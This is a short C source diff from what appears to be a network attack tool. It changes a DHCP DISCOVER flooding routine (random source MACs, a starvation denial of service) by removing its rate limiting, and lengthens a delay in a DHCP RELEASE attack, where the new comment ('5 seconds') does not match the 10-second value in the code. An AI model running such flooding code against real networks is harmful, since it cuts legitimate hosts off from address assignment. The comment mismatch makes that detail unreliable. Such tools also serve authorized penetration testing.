@@ -593,19 +593,7 @@ void dhcp_th_dos_send_discover( void *arg )
 {
     struct attacks *attacks = (struct attacks *)arg;
     struct dhcp_data *dhcp_data;
-    struct attack_param *param = NULL;
     sigset_t mask;
-
-    u_int32_t rate,delay;
-    
-    param = attacks->params;
-
-    memcpy((void *)&rate, (void *)param[DHCP_DOS_SEND_DISCOVER_RATE].value,4);
-
-    if (rate > 0)
-    {
-        delay = 1000000 / rate;
-    }
 
     pthread_mutex_lock(&attacks->attack_th.finished);
 
@@ -626,12 +614,6 @@ void dhcp_th_dos_send_discover( void *arg )
         attack_gen_mac(dhcp_data->mac_source);
 
         memcpy((void *)dhcp_data->chaddr, (void *)dhcp_data->mac_source,6);
-
-        if (rate > 0)
-        {
-            thread_usleep(delay);
-        }
-
         dhcp_send_discover(attacks);
 #ifdef NEED_USLEEP
         thread_usleep(100000);
@@ -928,7 +910,7 @@ void dhcp_th_dos_send_release( void *arg )
         write_log(1, "Error in dhcp_learn_mac for the server\n");
         dhcp_th_dos_send_release_exit(attacks);
     }
-    thread_usleep(1000000); // sleep for 1 seconds to see if there's arp throttling
+    thread_usleep(10000000); // sleep for 5 seconds to see if there's arp throttling
     /* loop */
     /* I believe the condition in english is "while current IP is lesser than the value of the last IP and while the attack is not stopped" */
     // If with this setup, the attack successfuly learns the server MAC and the MAC #1 and still fails on #2, then a delay between ARP requests should be implemented
